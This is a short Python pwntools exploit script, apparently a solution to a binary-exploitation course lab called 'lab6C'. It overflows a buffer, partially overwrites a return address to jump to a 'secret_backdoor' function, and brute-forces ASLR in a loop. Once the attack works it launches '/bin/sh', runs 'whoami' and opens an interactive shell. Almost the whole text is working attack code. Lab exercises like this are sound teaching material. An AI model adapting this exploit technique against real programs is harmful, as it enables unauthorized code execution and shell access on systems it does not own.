#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#### README ####
# just run the script, it should succeed after a few tens of tries
#### END ####

context.arch = "x86"

secret_backdoor = 0x0000072b

found_address = False

while not found_address:
    r = process("./lab6C")
    payload = "A"*(255-59)
    payload += "\x2b\x07"

    r.sendlineafter('>:', 'A'*40+'\xc6')

    r.sendlineafter('>:', payload)
    ret = r.recv(200)
    ret = r.recv(200)

    ret = ""

    r.sendline("/bin/sh")
    r.sendline("whoami")
    try:
        ret = r.recv(200, timeout=0.01)
    except:
        pass
    
    if ("alex" in ret):
        r.interactive()
        quit()
    
    r.close()
